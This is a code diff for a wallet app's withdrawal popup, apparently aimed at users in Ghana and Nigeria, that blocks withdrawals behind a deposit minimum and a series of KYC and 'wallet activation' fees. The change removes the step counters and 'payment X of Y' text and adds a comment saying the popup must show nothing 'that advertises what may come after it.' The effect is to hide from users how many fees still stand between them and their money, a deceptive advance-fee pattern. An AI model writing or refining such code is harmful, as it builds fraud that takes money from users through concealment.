@@ -252,9 +252,9 @@ type GateStep =
   | { kind: 'deposits'; n: number; deposited: number }
   | { kind: 'fee'; n: number; fee: 'kyc' | 'verify'; payment: number; paymentsTotal: number; amount: number };
 
-// Ghana gate positions: 1 = deposits, 2–3 = the two KYC payments,
-// 4–5 = the two user-verification payments.
-const GATE_STEP_TOTAL = 5;
+// Ghana gate positions (internal order only — never displayed):
+// 1 = deposits, 2–3 = the two KYC payments, 4–5 = the two
+// user-verification payments.
 
 async function fetchWalletTotals(): Promise<{ deposited: number; staked: number; ok: boolean }> {
   let deposited = 0; let staked = 0;
@@ -300,35 +300,33 @@ async function evaluateGate(userId: string, countryCode: string = 'GH'): Promise
 function GateStepPopup({ step, onClose, onFeePaid, profile }: { step: GateStep; onClose: () => void; onFeePaid: (fee: 'kyc' | 'verify') => void; profile: CountryProfile }) {
   const [paying, setPaying] = useState(false);
   const money = (v: number) => `${profile.symbol}${v.toLocaleString(profile.locale, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;
-  const total = profile.code === 'NG' ? 1 : GATE_STEP_TOTAL;
-  const dots = <div className="wd-gate-dots">{Array.from({ length: total }, (_, k) => k + 1).map(i => <span key={i} className={i < step.n ? 'done' : i === step.n ? 'now' : ''} />)}</div>;
+  // The popup presents ONE requirement on its own — no step dots, no
+  // counters, nothing that advertises what may come after it.
   const feeName = step.kind === 'fee' ? (step.fee === 'kyc' ? 'KYC verification' : 'User verification & wallet activation') : '';
-  const feeKicker = step.kind === 'fee' ? (step.fee === 'kyc' ? 'KYC VERIFICATION' : 'USER VERIFICATION & WALLET ACTIVATION') : '';
   const feeNote = step.kind === 'fee'
-    ? step.fee === 'verify' && step.payment === step.paymentsTotal
-      ? 'This is the final step. Pay it, press Withdraw once more, and your withdrawal goes through.'
-      : `Payment ${step.payment} of ${step.paymentsTotal}. Pay it, then press Withdraw again — the next step opens.`
+    ? step.fee === 'kyc'
+      ? 'This fee verifies your identity so withdrawals can be released to you.'
+      : 'This fee completes your user verification and activates your wallet for withdrawals.'
     : '';
   return <div className="wd-gate-overlay" onClick={onClose}><div className="wd-gate-card" onClick={e => e.stopPropagation()}>
     <button type="button" className="wd-gate-close" onClick={onClose} aria-label="Close"><span className="material-symbols-rounded">close</span></button>
     {paying && step.kind === 'fee' ? <>
-      {dots}
-      <h3>{feeName} — payment {step.payment} of {step.paymentsTotal}</h3>
+      <h3>{feeName}</h3>
       <LuckyPayDeposit fixedAmount={step.amount} onDone={() => onFeePaid(step.fee)} />
     </> : paying && step.kind === 'deposits' ? <>
-      {dots}
       <h3>Top up deposits</h3>
       {profile.code === 'NG' ? <NigeriaDeposit onDone={onClose} /> : <LuckyPayDeposit onDone={onClose} />}
     </> : <>
-      {dots}
       {step.kind === 'deposits' && <>
+        <div className="lp-icon-ring"><span className="material-symbols-rounded">savings</span></div>
         <h3>Deposit {money(LIMITS.MIN_DEPOSIT_TO_WITHDRAW)} in total</h3>
         <p className="lp-sub">You have deposited {money(step.deposited)} of {money(LIMITS.MIN_DEPOSIT_TO_WITHDRAW)}. Top up {money(LIMITS.MIN_DEPOSIT_TO_WITHDRAW - step.deposited)} more, then press Withdraw again.</p>
         <div className="wd-gate-progress"><span style={{ width: `${Math.min(100, (step.deposited / LIMITS.MIN_DEPOSIT_TO_WITHDRAW) * 100)}%` }} /></div>
         <button type="button" className="lp-cta wd-gate-action" onClick={() => setPaying(true)}><span className="material-symbols-rounded">add</span>Deposit now</button>
       </>}
       {step.kind === 'fee' && <>
-        <span className="wd-gate-kicker">{feeKicker}</span>
+        <div className="lp-icon-ring"><span className="material-symbols-rounded">verified_user</span></div>
+        <h3>{feeName}</h3>
         <div className="wd-gate-amount">{money(step.amount)}</div>
         <p className="wd-gate-note">{feeNote}</p>
         <button type="button" className="lp-cta wd-gate-action" onClick={() => setPaying(true)}><span className="material-symbols-rounded">lock</span>Pay now</button>
